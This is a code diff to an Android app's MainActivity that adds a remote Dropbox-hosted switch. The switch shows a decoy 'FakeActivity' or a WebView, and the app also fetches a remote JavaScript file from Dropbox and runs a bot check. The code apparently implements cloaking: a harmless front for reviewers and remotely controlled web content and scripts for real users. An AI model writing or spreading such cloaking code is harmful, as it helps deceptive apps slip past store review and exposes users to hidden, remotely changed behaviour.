@@ -20,6 +20,7 @@ import android.view.KeyEvent
 import android.view.View
 import android.view.WindowManager
 import android.webkit.*
+import android.widget.ProgressBar
 import androidx.appcompat.app.AppCompatActivity
 import bolts.AppLinks
 import com.appsflyer.AppsFlyerConversionListener
@@ -31,7 +32,7 @@ import com.facebook.appevents.AppEventsLogger
 import com.facebook.applinks.AppLinkData
 import com.onesignal.OSNotification
 import com.onesignal.OneSignal
-import com.organizationzaim.multiapp.FakeView.Game.GameActivity
+import com.organizationzaim.multiapp.FakeView.FakeActivity
 import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -39,6 +40,7 @@ import org.json.JSONException
 import org.json.JSONObject
 import java.io.File
 import java.io.IOException
+import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -48,10 +50,11 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     private lateinit var okHttpClient: OkHttpClient
     private lateinit var preferences: SharedPreferences
     private lateinit var dialog: AlertDialog
-    lateinit var script : String
+    private lateinit var progressBar: ProgressBar
+    private var script : String = ""
 
     private var isConnected                                   = true
-    private var webView: WebView?                             = null
+    private lateinit var webView: WebView
     private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
     private var mCameraPhotoPath: String?                     = null
     private var alertDialog: AlertDialog?                     = null
@@ -87,6 +90,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        progressBar = findViewById(R.id.progressBar)
+
         GlobalScope.launch(Dispatchers.Main) {
             val analyticsJs =
                 "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //DEBUG!!!
@@ -95,14 +100,28 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
 
             script = scriptTask.await()
         }
+        GlobalScope.launch(Dispatchers.Main) {
+            val switcherUrl = "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0"
+            val switcher = withContext(Dispatchers.IO) { URL(switcherUrl).readText(Charsets.UTF_8) }
+            if (!switcher.isBlank()) {
+                Log.d(TAG, "text $switcher")
+                if (switcher == "tru1e") {
+                    progressBar.visibility = ProgressBar.GONE
+                    startActivity(Intent(this@MainActivity, FakeActivity::class.java))
+                    finish()
+                    return@launch
+                }
+            }
+        }
         FacebookSdk.setApplicationId("293366948652919")
+
 
         initWebView()
         initOkHttpClient()
         initSDK()
 
-        dialog = AlertDialog.Builder(this).apply {
-            setTitle("No Internet Connection")
+            dialog = AlertDialog.Builder(this).apply {
+                setTitle("No Internet Connection")
             setMessage("Turn on the the network")
             setCancelable(false)
             setFinishOnTouchOutside(false)
@@ -258,7 +277,9 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
             Log.d(TAG, "IS_BOT$isBot")
 
             if (0 == 1) {
-                startActivity(Intent(this@MainActivity, GameActivity::class.java))
+                progressBar.visibility = ProgressBar.GONE
+                startActivity(Intent(this@MainActivity, FakeActivity::class.java))
+
                 finish()
             } else {
                 handler.post(conversionTask)
@@ -324,6 +345,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
     webView?.settings?.mediaPlaybackRequiresUserGesture = true
 }
     private fun startWebView(startUrl:String)                                                  {
+        webView.visibility = WebView.VISIBLE
         webView?.loadUrl(startUrl)
 
         webView?.setNetworkAvailable(isConnected)
@@ -335,10 +357,8 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
         }
 
         webView?.webChromeClient = FileChooseClient(this)
+
         webView?.webViewClient = object : WebViewClient() {
-            override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
-                super.onPageStarted(view, url, favicon)
-            }
             override fun onPageFinished(view: WebView?, url: String?) {
                 CookieManager.getInstance().flush()
 //                        if (progressBar?.isShowing!!) {
@@ -357,7 +377,6 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
                 alertDialog?.show()
                 if (errorCode == ERROR_TIMEOUT) {
                     view.stopLoading()
-                    // view.loadData(timeoutMessageHtml, "text/html", "utf-8");
                 }
             }
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
